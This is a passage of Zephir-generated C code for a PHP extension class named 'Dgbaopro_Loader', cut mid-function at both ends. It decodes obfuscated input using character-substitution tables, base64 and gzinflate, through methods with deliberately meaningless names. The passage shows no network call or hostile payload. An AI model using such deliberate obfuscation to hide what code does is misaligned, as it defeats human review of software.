		ZVAL_STRING(&_6$$3, "Q");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "n");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "6");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "7");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "3");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "c");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "k");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "I");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "o");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "9");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "K");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "r");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "q");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "u");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "s");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "X");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "w");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "z");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "v");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "V");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "N");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "C");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "b");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "Y");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "m");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "1");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "f");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "P");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "T");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "x");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "d");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "A");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "U");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "a");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "j");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "M");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "D");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "B");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "0");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "S");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "W");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "Z");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "F");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "H");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "J");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "5");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "4");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		zephir_fast_str_replace(&_4$$3, &_5$$3, &_7$$3, &_);
		zephir_get_strval(&_, &_4$$3);
		ZEPHIR_CALL_STATIC(&_8$$3, "_", &_9, 11, &_, &__);
		zephir_check_call_status();
		zephir_get_strval(&_, &_8$$3);
		RETURN_CTOR(&_);
	} else {
		ZEPHIR_INIT_VAR(&_10$$4);
		ZVAL_STRING(&_10$$4, "Encode ERROR : Không tìm thấy API !\n");
		ZEPHIR_CALL_FUNCTION(NULL, "print_r", NULL, 1, &_10$$4);
		zephir_check_call_status();
		zephir_read_static_property_ce(&_11$$4, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
		_12$$4 = zephir_is_true(&_11$$4);
		if (_12$$4) {
			zephir_read_static_property_ce(&_13$$4, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
			_12$$4 = !ZEPHIR_IS_FALSE_IDENTICAL(&_13$$4);
		}
		if (_12$$4) {
			ZVAL_BOOL(&_15$$5, 1);
			ZEPHIR_CALL_STATIC(NULL, "__", &_14, 2, &_15$$5);
			zephir_check_call_status();
		}
		ZEPHIR_MM_RESTORE();
		zephir_exit_empty();
	}
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, _______________________)
{
	zval _2, _4;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zephir_fcall_cache_entry *_6 = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zval *__param = NULL, *___param = NULL, _0, _1, _3, _5;
	zval _, __;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_1);
	ZVAL_UNDEF(&_3);
	ZVAL_UNDEF(&_5);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_4);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(2, 2)
		Z_PARAM_STR(_)
		Z_PARAM_STR(__)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 2, 0, &__param, &___param);
	zephir_get_strval(&_, __param);
	zephir_get_strval(&__, ___param);


	ZEPHIR_CALL_FUNCTION(&_0, "base64_decode", NULL, 6, &_);
	zephir_check_call_status();
	zephir_get_strval(&_, &_0);
	ZEPHIR_INIT_VAR(&_1);
	ZEPHIR_INIT_VAR(&_2);
	zephir_create_array(&_2, 67, 0);
	ZEPHIR_INIT_VAR(&_3);
	ZVAL_STRING(&_3, "⊐");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋀");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊂");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊾");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊊");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊯");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊖");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊅");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋅");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋂");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊵");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊃");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋁");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊢");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊳");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊇");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊴");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊭");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊉");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋄");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊤");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊱");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋇");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊒");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊜");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊶");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊩");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊗");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊣");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊙");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋈");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊪");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊷");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊥");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊬");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊈");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊛");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋆");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⋃");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊮");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊞");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊲");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊟");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊋");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊁");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊡");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊦");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊧");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊘");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊿");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊀");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊨");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊰");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊫");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊠");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊝");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊕");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊚");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊄");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊆");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊏");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "⊑");
	zephir_array_fast_append(&_2, &_3);
	ZEPHIR_INIT_VAR(&_4);
	zephir_create_array(&_4, 67, 0);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "y");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "M");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "m");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "A");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "x");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "r");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "F");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "T");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "X");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "B");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "q");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "v");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "w");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "t");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "Y");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "N");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "d");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "V");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "4");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "C");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "P");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "j");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "h");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "u");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "5");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "U");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "a");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "S");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "1");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "k");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "o");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "z");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "R");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "L");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "Q");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "l");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "s");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "0");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "g");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "K");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "D");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "8");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "E");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "e");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "3");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "n");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "J");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "G");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "b");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "Z");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "f");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "7");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "c");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "9");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "p");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "H");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "W");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "i");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "O");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "I");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "6");
	zephir_array_fast_append(&_4, &_3);
	ZEPHIR_INIT_NVAR(&_3);
	ZVAL_STRING(&_3, "2");
	zephir_array_fast_append(&_4, &_3);
	zephir_fast_str_replace(&_1, &_2, &_4, &_);
	zephir_get_strval(&_, &_1);
	ZEPHIR_CALL_STATIC(&_5, "_", &_6, 11, &_, &__);
	zephir_check_call_status();
	zephir_get_strval(&_, &_5);
	RETURN_CTOR(&_);
}

PHP_METHOD(Dgbaopro_Loader, _____________)
{
	zend_bool _1, _25$$8;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zephir_fcall_cache_entry *_8 = NULL, *_16 = NULL, *_27 = NULL;
	zval k, oc, _4$$3;
	zval *l_param = NULL, *k_param = NULL, *oc_param = NULL, _0, _2, _3$$3, o$$3, op$$3, g$$3, h$$3, _14$$3, _15$$3, oct$$3, _17$$3, _18$$3, opt$$3, rs$$3, p$$3, *_19$$3, _20$$3, _5$$4, _6$$4, _7$$4, _9$$4, _10$$5, _11$$5, _12$$5, _13$$5, _21$$6, _22$$7, _23$$8, _24$$8, _26$$8, _28$$9;
	zend_long l, ZEPHIR_LAST_CALL_STATUS, i$$3;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_3$$3);
	ZVAL_UNDEF(&o$$3);
	ZVAL_UNDEF(&op$$3);
	ZVAL_UNDEF(&g$$3);
	ZVAL_UNDEF(&h$$3);
	ZVAL_UNDEF(&_14$$3);
	ZVAL_UNDEF(&_15$$3);
	ZVAL_UNDEF(&oct$$3);
	ZVAL_UNDEF(&_17$$3);
	ZVAL_UNDEF(&_18$$3);
	ZVAL_UNDEF(&opt$$3);
	ZVAL_UNDEF(&rs$$3);
	ZVAL_UNDEF(&p$$3);
	ZVAL_UNDEF(&_20$$3);
	ZVAL_UNDEF(&_5$$4);
	ZVAL_UNDEF(&_6$$4);
	ZVAL_UNDEF(&_7$$4);
	ZVAL_UNDEF(&_9$$4);
	ZVAL_UNDEF(&_10$$5);
	ZVAL_UNDEF(&_11$$5);
	ZVAL_UNDEF(&_12$$5);
	ZVAL_UNDEF(&_13$$5);
	ZVAL_UNDEF(&_21$$6);
	ZVAL_UNDEF(&_22$$7);
	ZVAL_UNDEF(&_23$$8);
	ZVAL_UNDEF(&_24$$8);
	ZVAL_UNDEF(&_26$$8);
	ZVAL_UNDEF(&_28$$9);
	ZVAL_UNDEF(&k);
	ZVAL_UNDEF(&oc);
	ZVAL_UNDEF(&_4$$3);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(3, 3)
		Z_PARAM_LONG(l)
		Z_PARAM_STR(k)
		Z_PARAM_STR(oc)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 3, 0, &l_param, &k_param, &oc_param);
	l = zephir_get_intval(l_param);
	zephir_get_strval(&k, k_param);
	zephir_get_strval(&oc, oc_param);


	zephir_read_static_property_ce(&_0, dgbaopro_loader_ce, SL("p"), PH_NOISY_CC | PH_READONLY);
	_1 = zephir_is_true(&_0);
	if (_1) {
		zephir_read_static_property_ce(&_2, dgbaopro_loader_ce, SL("l"), PH_NOISY_CC | PH_READONLY);
		_1 = zephir_is_true(&_2);
	}
	if (_1) {
		ZEPHIR_CALL_FUNCTION(&_3$$3, "gzinflate", NULL, 10, &oc);
		zephir_check_call_status();
		zephir_get_strval(&oc, &_3$$3);
		ZEPHIR_INIT_VAR(&o$$3);
		ZVAL_STRING(&o$$3, "");
		ZEPHIR_INIT_VAR(&_4$$3);
		ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS(&_4$$3, "n", "l", "c", "6", "e", "7", "_", "o", "f", "w", "s", "g", "r", "j", "9", "3", "h", "m", "y", "p", "d", "u", "z", "0", "1", "2", "i", "4", "k", "a", "5", "b", "x", "q", "t", "v", "8");
		ZEPHIR_CPY_WRT(&o$$3, &_4$$3);
		ZEPHIR_INIT_VAR(&op$$3);
		array_init(&op$$3);
		ZEPHIR_CALL_FUNCTION(&op$$3, "str_split", NULL, 26, &o$$3);
		zephir_check_call_status();
		i$$3 = 1;
		ZEPHIR_INIT_VAR(&g$$3);
		ZVAL_STRING(&g$$3, "");
		while (1) {
			if (!(i$$3 <= l)) {
				break;
			}
			zephir_array_fetch_long(&_5$$4, &op$$3, i$$3, PH_NOISY | PH_READONLY, "dichvucoder.com", 333);
			ZVAL_LONG(&_6$$4, i$$3);
